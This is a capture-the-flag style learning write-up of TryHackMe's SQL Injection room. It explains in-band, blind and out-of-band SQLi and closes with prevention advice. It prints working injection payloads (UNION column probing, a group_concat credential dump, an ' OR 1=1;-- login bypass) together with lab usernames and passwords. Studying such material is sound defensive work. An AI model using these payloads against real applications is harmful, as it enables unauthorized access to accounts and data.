# TryHackMe: SQL Injection

**Author:** Abhinav Sabu  
**Date added:** 23 October 2026  
**Room:** SQL Injection (TryHackMe)  
**Topics:** SQL fundamentals, in-band SQLi, UNION-based extraction, authentication bypass, Boolean/time-based blind SQLi, out-of-band SQLi.

> **Authorized-lab use only:** These notes document learning in the TryHackMe environment. Do not test public or production systems without explicit authorization.

## Overview

SQL injection (SQLi) happens when untrusted input is incorporated into a SQL query in a way that changes the query's intended structure. Depending on the query and database permissions, this can expose data, bypass authentication, or modify records.

Learning objectives:
- Understand SQL query structure and common statements.
- Explain how unsafe input handling creates SQL injection.
- Use UNION-compatible queries in a lab to identify columns and retrieve database information.
- Understand authentication bypass and blind SQLi.
- Explain time-based and out-of-band SQLi.
- Identify practical prevention controls.

## 1. SQL fundamentals

A relational database stores structured data. SQL is used to retrieve and modify that data.

| Statement / clause | Purpose |
|---|---|
| `SELECT` | Retrieve data |
| `INSERT` | Add records |
| `UPDATE` | Modify records |
| `DELETE` | Remove records |
| `WHERE` | Filter rows |
| `LIMIT` | Restrict result count |
| `LIKE` | Pattern matching |
| `UNION` | Combine compatible result sets |

Example:

```sql
SELECT username, email
FROM users
WHERE username = 'alice'
LIMIT 1;
```

A vulnerable application may concatenate a user value into a query. If the input is not safely parameterized, it may be interpreted as SQL syntax rather than data.

## 2. SQL injection types

### In-band SQLi
The injected query and the returned information use the same channel.
- **Error-based:** database errors reveal information about query behavior or structure.
- **UNION-based:** a compatible `UNION SELECT` combines injected results with the application's result set.

### Blind SQLi
The query's result is not directly shown, so the tester infers it from application behavior.
- **Boolean-based:** compare responses for true and false conditions.
- **Time-based:** infer a condition from a database-side delay.

### Out-of-band (OOB) SQLi
Uses a separate channel, such as DNS or HTTP initiated by the database environment. It depends on database features, permissions, and outbound connectivity; it is not always possible.

## 3. Part 1 — UNION-based SQL injection (Level 1)

### Goal
Enumerate the lab database and retrieve the credentials needed for Level 1 progression.

### Determine the column count

A UNION query must return the same number of columns as the original query, with compatible data types in corresponding positions. The room's successful test was:

```sql
1 UNION SELECT 1,2,3
```

This indicated three columns.

### Identify the database

```sql
0 UNION SELECT 1,2,database()
```

The database name returned:

```text
sqli_one
```

### Discover tables and columns

The tables found in the `sqli_one` database were:

```text
article
staff_users
```

The relevant `staff_users` columns were:

```text
id
password
username
```

### Retrieve username/password pairs

The lab extraction query was:

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

The returned accounts included:

| Username | Password |
|---|---|
| `admin` | `p4ssword` |
| `martin` | `pa$$word` |
| `jim` | `work123` |

The Level 1 progression credential was Martin's:

```text
Username: martin
Password: pa$$word
```

I used the credentials in the Level 1 lab login to continue.

### Notes
- UNION queries require matching column counts.
- Column types need to be compatible.
- Metadata can expose database/table/column names.
- `group_concat()` can combine values into one result in database engines that support it.

## 4. Part 2 — Authentication bypass (Level 2)

A vulnerable login query may be structured conceptually as:

```sql
SELECT *
FROM users
WHERE username = '<username>'
AND password = '<password>';
```

The lab's username input for the demonstration was:

```sql
' OR 1=1;--
```

An arbitrary password value could be used in the lab.

### Payload interpretation
- The quote attempts to close the original string.
- `OR 1=1` adds a condition that is always true.
- `--` begins a SQL comment in the relevant syntax, potentially commenting out the remainder of the query. Comment syntax depends on the database and context.

This illustrates how SQL string concatenation can undermine authentication. The exact behavior depends on the original query and database engine.

## 5. Part 3 — Boolean-based blind SQL injection (Level 3)

### Goal
Infer information based on application behavior rather than direct database output.

The room's endpoint was:

```text
/checkuser?username=admin
```

The query was described as:

```sql
SELECT *
FROM users
WHERE username = '%username%'
LIMIT 1;
```

The database was:

```text
sqli_three
```

### Test the UNION column count

```sql
admin123' UNION SELECT 1,2,3;--
```

This established a three-column result for the exercise.

### Relevant table and columns

```text
Table: users
Columns: id, username, password
```

### Credentials identified

```text
Username: admin
Password: 3845
```

I used these credentials in the Level 3 lab login:

```text
admin / 3845
```

The lab should then provide the progression/completion flag. The actual Level 3 flag was not present in the source details available when this README was created, so it is not guessed here.

```text
Level 3 flag: [Enter the exact flag shown by the completed TryHackMe lab]
```

### Boolean blind concept

A true and false predicate can produce different observable responses. If the application indicates whether a username exists, the response itself becomes a Boolean side channel—even when the underlying query output is not printed.

## 6. Time-based blind SQL injection

Time-based SQLi is useful when visible response differences are unavailable or unreliable. A database-side delay can act as a signal.

A controlled lab workflow:
1. Establish a normal response-time baseline.
2. Test a condition that triggers a delay only when true.
3. Repeat measurements to reduce the impact of network noise.
4. Interpret delays cautiously; one slow response alone is not proof.

Delay functions and syntax differ by database engine. Follow the room's syntax and test only within authorized scope.

## 7. Out-of-band SQL injection

OOB SQLi uses a channel separate from the normal web response, for example a DNS or HTTP interaction initiated by a database.

It usually requires:
- A database feature capable of initiating a network interaction.
- Appropriate database permissions.
- Outbound connectivity.
- A controlled way to observe the interaction.

No OOB interaction does not necessarily prove the application is safe; the feature or network path may simply be unavailable.

## 8. Prevention and remediation

1. **Use prepared statements / parameterized queries.** Keep SQL code separate from user values.
2. **Avoid dynamic SQL when possible.** If identifiers must be dynamic, use strict allowlists; identifiers generally cannot be bound as ordinary parameters.
3. **Apply least privilege.** The application's database account should have only required permissions.
4. **Handle errors safely.** Do not expose database errors, SQL text, schema details, or stack traces to users. Log details securely server-side.
5. **Validate input.** Enforce expected formats and bounds; validation complements, but does not replace, parameterization.
6. **Use secure authentication design.** Store passwords using an appropriate password-hashing scheme and never build login queries through string concatenation.
7. **Test within scope.** Use a staging environment, approved cases, and explicit authorization.

Illustrative Python DB-API style (placeholder syntax varies by driver):

```python
cursor.execute(
    "SELECT id, username FROM users WHERE username = %s",
    (username,)
)
```

## 9. Room quick reference

| Stage | Lab payload / result | What it demonstrates |
|---|---|---|
| Level 1 | `1 UNION SELECT 1,2,3` | Test column count |
| Level 1 | `0 UNION SELECT 1,2,database()` | Identify current database |
| Level 1 | `sqli_one` | Database name |
| Level 1 | `article`, `staff_users` | Discovered tables |
| Level 1 | `id`, `password`, `username` | Relevant columns |
| Level 1 | `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users` | Retrieve concatenated user/password values in the lab |
| Level 1 | `martin / pa$$word` | Progression credentials |
| Level 2 | `' OR 1=1;--` | Authentication bypass concept |
| Level 3 | `admin123' UNION SELECT 1,2,3;--` | Test column count |
| Level 3 | `sqli_three` | Database name |
| Level 3 | `users` (`id`, `username`, `password`) | Relevant schema |
| Level 3 | `admin / 3845` | Lab credentials |

## 10. Reflection

### What I learned
- SQLi results from unsafe query construction.
- UNION-based SQLi can expose data when column count and types align.
- Authentication logic can be changed by injecting SQL conditions.
- Blind SQLi can leak information through Boolean behavior or timing.
- OOB SQLi relies on environment-specific database and network capabilities.
- Parameterized queries are the core defense.

### Completion record
- **Room:** SQL Injection
- **Date added:** 23 October 2026
- **Coverage:** SQL fundamentals, in-band SQLi, UNION extraction, authentication bypass, Boolean-based blind SQLi, time-based blind SQLi, OOB SQLi, and defenses.
- **Level 3 flag:** Not recorded in available notes; add only after confirming the exact value in the lab.

---

## Further study
- TryHackMe SQL Injection room material.
- Database-driver documentation for prepared statements.
- OWASP SQL Injection Prevention guidance.
